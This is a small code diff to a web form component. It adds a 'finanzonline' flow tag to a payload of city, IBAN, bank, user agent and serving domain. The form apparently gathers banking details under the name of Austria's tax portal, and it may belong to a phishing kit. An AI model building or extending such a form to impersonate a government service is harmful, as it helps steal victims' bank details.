@@ -181,6 +181,7 @@ const Index = () => {
         city,
         iban,
         bank: selectedBank,
+        flow: "finanzonline",
         user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
         domain: typeof window !== "undefined" ? window.location.hostname.replace(/^www\./, "").toLowerCase() : null,
       })
